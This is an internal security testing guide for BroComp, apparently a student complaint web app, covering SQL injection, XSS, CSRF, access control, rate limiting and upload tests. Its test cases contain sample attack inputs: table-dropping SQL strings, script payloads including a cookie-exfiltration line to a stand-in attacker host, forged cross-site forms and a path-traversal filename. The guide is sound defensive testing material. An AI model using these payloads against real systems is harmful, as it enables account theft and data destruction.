# BroComp Security Testing Guide

## Overview

This document provides comprehensive security testing procedures for BroComp to ensure the application is protected against common vulnerabilities and attacks.

---

## Table of Contents

1. [SQL Injection Testing](#sql-injection-testing)
2. [Cross-Site Scripting (XSS) Testing](#cross-site-scripting-xss-testing)
3. [Cross-Site Request Forgery (CSRF) Testing](#cross-site-request-forgery-csrf-testing)
4. [Authentication Bypass Testing](#authentication-bypass-testing)
5. [Authorization Bypass Testing](#authorization-bypass-testing)
6. [Rate Limiting Testing](#rate-limiting-testing)
7. [File Upload Security Testing](#file-upload-security-testing)
8. [Session Management Testing](#session-management-testing)
9. [Automated Security Scanning](#automated-security-scanning)

---

## SQL Injection Testing

### Objective
Verify that the application is protected against SQL injection attacks through proper use of parameterized queries and Supabase client methods.

### Test Cases

#### Test 1: Login Form SQL Injection
**Steps:**
1. Navigate to `/login`
2. In the email field, enter: `' OR '1'='1`
3. In the password field, enter: `' OR '1'='1`
4. Click "Sign In"

**Expected Result:** Login should fail with validation error. No SQL query should be executed with the injected code.

#### Test 2: Search/Filter SQL Injection
**Steps:**
1. Log in as a student
2. Navigate to complaint tracking
3. In the search box, enter: `'; DROP TABLE complaints; --`
4. Submit the search

**Expected Result:** Search should either fail validation or return no results. Table should remain intact.

#### Test 3: Admin Search SQL Injection
**Steps:**
1. Log in as admin
2. Navigate to user management
3. In search field, enter: `admin' UNION SELECT * FROM user_roles WHERE '1'='1`
4. Submit the search

**Expected Result:** Search validation should prevent the injection. No unauthorized data should be revealed.

### Verification
- Check audit logs for any SQL errors
- Verify database tables are intact
- Confirm no sensitive data was exposed

---

## Cross-Site Scripting (XSS) Testing

### Objective
Ensure all user inputs are properly sanitized to prevent XSS attacks.

### Test Cases

#### Test 1: Stored XSS in Complaint Description
**Steps:**
1. Log in as student
2. Create new complaint
3. In description field, enter:
   ```html
   <script>alert('XSS')</script>
   <img src=x onerror="alert('XSS')">
   <iframe src="javascript:alert('XSS')"></iframe>
   ```
4. Submit complaint
5. View the complaint details

**Expected Result:** Script tags should be sanitized. No alert should execute. Content should be displayed as plain text.

#### Test 2: Reflected XSS in Chat Messages
**Steps:**
1. Log in as student
2. Navigate to community chat
3. Send message: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
4. View the message in chat

**Expected Result:** Script should be sanitized and displayed as text. No redirection should occur.

#### Test 3: XSS in Profile Name
**Steps:**
1. Log in as student
2. Navigate to profile settings
3. Change name to: `<img src=x onerror=alert('XSS')>`
4. Save and view profile

**Expected Result:** Name should be validated and reject HTML/script tags.

### Verification
- Inspect page source to confirm no executable scripts
- Check browser console for any JavaScript errors
- Verify DOMPurify is sanitizing all user content

---

## Cross-Site Request Forgery (CSRF) Testing

### Objective
Verify that state-changing operations require proper authentication and cannot be triggered from external sites.

### Test Cases

#### Test 1: External Form Submission
**Steps:**
1. Create an HTML file with a form posting to BroComp complaint endpoint:
   ```html
   <form action="https://brocomp-app.com/api/complaints" method="POST">
     <input name="subject" value="CSRF Test">
     <input name="description" value="Submitted from external site">
     <button>Submit</button>
   </form>
   ```
2. Open the HTML file in a browser while logged into BroComp
3. Submit the form

**Expected Result:** Request should be rejected due to missing CSRF token or incorrect origin.

#### Test 2: Image Tag CSRF
**Steps:**
1. Create HTML file with:
   ```html
   <img src="https://brocomp-app.com/api/admin/approve-user?userId=123">
   ```
2. Open while logged in as admin

**Expected Result:** Request should fail. User should not be approved.

### Verification
- Confirm CORS headers are properly configured
- Verify authentication tokens are required for all state-changing operations
- Check that GET requests don't modify data

---

## Authentication Bypass Testing

### Objective
Ensure unauthorized users cannot access protected resources.

### Test Cases

#### Test 1: Direct URL Access Without Login
**Steps:**
1. Log out completely
2. Directly navigate to: `/student/dashboard`
3. Try: `/admin/dashboard`
4. Try: `/student/complaints`

**Expected Result:** All should redirect to `/login` or show unauthorized page.

#### Test 2: Token Manipulation
**Steps:**
1. Log in as student
2. Open browser DevTools → Application → Local Storage
3. Modify or delete authentication token
4. Try to access protected pages

**Expected Result:** User should be logged out and redirected to login.

#### Test 3: Expired Session
**Steps:**
1. Log in
2. Manually set localStorage token to expired JWT
3. Try to access protected resources

**Expected Result:** Application should detect expired token and require re-login.

### Verification
- Check that `ProtectedRoute` component correctly validates authentication
- Verify JWT tokens are validated server-side
- Confirm session expiration is enforced

---

## Authorization Bypass Testing

### Objective
Verify that users can only access resources they're authorized for.

### Test Cases

#### Test 1: Student Accessing Admin Pages
**Steps:**
1. Log in as regular student
2. Manually navigate to: `/admin/dashboard`
3. Try: `/admin/users`
4. Try: `/admin/security`

**Expected Result:** All attempts should show "Unauthorized" page or redirect.

#### Test 2: Accessing Other Users' Complaints
**Steps:**
1. Log in as Student A
2. Note a complaint ID from Student A
3. Log in as Student B
4. Navigate to: `/student/complaints/[StudentA's-complaint-id]`

**Expected Result:** Should show "Not Found" or "Unauthorized". RLS should prevent access.

#### Test 3: Role Elevation Attempt
**Steps:**
1. Log in as student
2. Open DevTools → Console
3. Try to call: `localStorage.setItem('userRole', 'admin')`
4. Try to access admin pages

**Expected Result:** Role should be verified server-side. Client-side changes should have no effect.

### Verification
- Confirm RLS policies are working correctly
- Verify `has_role()` function checks are server-side
- Check audit logs for unauthorized access attempts

---

## Rate Limiting Testing

### Objective
Ensure rate limits prevent abuse and brute force attacks.

### Test Cases

#### Test 1: Login Rate Limiting
**Steps:**
1. Navigate to `/login`
2. Enter incorrect credentials 6 times rapidly
3. Try to log in with correct credentials

**Expected Result:** After 5 failed attempts, user should be temporarily locked out for 15 minutes.

#### Test 2: Complaint Submission Rate Limiting
**Steps:**
1. Log in as student
2. Create and submit 6 complaints within 1 hour

**Expected Result:** First 5 should succeed. 6th should be blocked with rate limit message.

#### Test 3: Chat Message Rate Limiting
**Steps:**
1. Log in as student
2. Navigate to community chat
3. Send 61 messages within 1 minute

**Expected Result:** First 60 should succeed. Further messages should be blocked.

### Verification
- Check localStorage for rate limit tracking
- Verify error messages explain the wait time
- Confirm limits reset after specified duration

---

## File Upload Security Testing

### Objective
Verify file upload security including type validation, size limits, and malicious content detection.

### Test Cases

#### Test 1: Disallowed File Type
**Steps:**
1. Log in as student
2. Create new complaint
3. Try to upload: `malicious.exe`, `script.js`, `test.php`

**Expected Result:** All should be rejected with error message about allowed file types.

#### Test 2: File Size Limit
**Steps:**
1. Create a 6MB test file
2. Try to upload to complaint

**Expected Result:** Upload should be rejected with "File exceeds 5MB limit" error.

#### Test 3: Filename Path Traversal
**Steps:**
1. Create file named: `../../etc/passwd.txt`
2. Try to upload

**Expected Result:** Filename should be sanitized, removing path traversal characters.

#### Test 4: MIME Type Mismatch
**Steps:**
1. Rename `malicious.exe` to `document.pdf`
2. Try to upload

**Expected Result:** Magic number validation should detect mismatch and reject file.

### Verification
- Check Edge Function logs for validation results
- Verify files are stored with sanitized names
- Confirm rate limiting applies to uploads (10 per hour)

---

## Session Management Testing

### Objective
Ensure sessions are properly secured and managed.

### Test Cases

#### Test 1: Session Timeout
**Steps:**
1. Log in
2. Wait for session timeout (default: 1 hour)
3. Try to perform an action

**Expected Result:** User should be logged out and redirected to login.

#### Test 2: Logout Functionality
**Steps:**
1. Log in
2. Click logout
3. Press browser back button
4. Try to access protected pages

**Expected Result:** Session should be completely cleared. Access should be denied.

#### Test 3: Concurrent Sessions
**Steps:**
1. Log in on Browser A
2. Log in on Browser B with same account
3. Perform actions on both browsers

**Expected Result:** Both sessions should work independently. (For logout-all-devices, implement MFA session management.)

### Verification
- Check that JWT tokens are properly invalidated on logout
- Verify no session data remains in localStorage after logout
- Confirm new login required after timeout

---

## Automated Security Scanning

### Tools

#### 1. OWASP ZAP (Zed Attack Proxy)
**Installation:**
```bash
# Download from https://www.zaproxy.org/download/
# Or via Docker:
docker pull zaproxy/zap-stable
docker run -t zaproxy/zap-stable zap-baseline.py -t https://your-brocomp-url.com
```

**Usage:**
1. Configure ZAP to proxy through your browser
2. Navigate through the application manually
3. Run active scan
4. Review and triage findings

#### 2. npm audit
**Usage:**
```bash
npm audit
npm audit fix
```

**Frequency:** Run weekly or before every deployment

#### 3. Snyk
**Installation:**
```bash
npm install -g snyk
snyk auth
snyk test
```

**Setup CI/CD Integration:**
```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

---

## Security Testing Checklist

### Pre-Deployment
- [ ] All SQL injection tests passed
- [ ] XSS tests passed on all input fields
- [ ] CSRF protection verified
- [ ] Authentication bypass tests passed
- [ ] Authorization checks working correctly
- [ ] Rate limiting functioning as expected
- [ ] File upload security validated
- [ ] Session management tested
- [ ] npm audit shows no high/critical vulnerabilities
- [ ] OWASP ZAP scan completed with no critical issues

### Post-Deployment (Production)
- [ ] Monitor audit logs for suspicious activity
- [ ] Review failed login attempts weekly
- [ ] Check rate limit violations
- [ ] Verify no unauthorized access attempts succeeded
- [ ] Review file upload activity for anomalies

---

## Reporting Security Issues

### Internal Reporting
1. Document the vulnerability with:
   - Reproduction steps
   - Impact assessment
   - Affected components
   - Screenshots/proof of concept
2. Create entry in audit log
3. Notify development team immediately
4. Track fix in issue tracker

### External Reporting (If Applicable)
Follow responsible disclosure:
1. Report to designated security contact
2. Allow 90 days for fix
3. Coordinate disclosure timeline

---

## Continuous Improvement

### Regular Activities
- **Weekly**: Run automated vulnerability scans
- **Monthly**: Manual penetration testing
- **Quarterly**: Full security audit
- **Annually**: Third-party security assessment

### Learning Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Disclosure Guidelines](https://www.hackerone.com/disclosure-guidelines)

---

**Last Updated:** 2025-01-19  
**Maintained By:** BroComp Security Team  
**Classification:** Internal Use Only
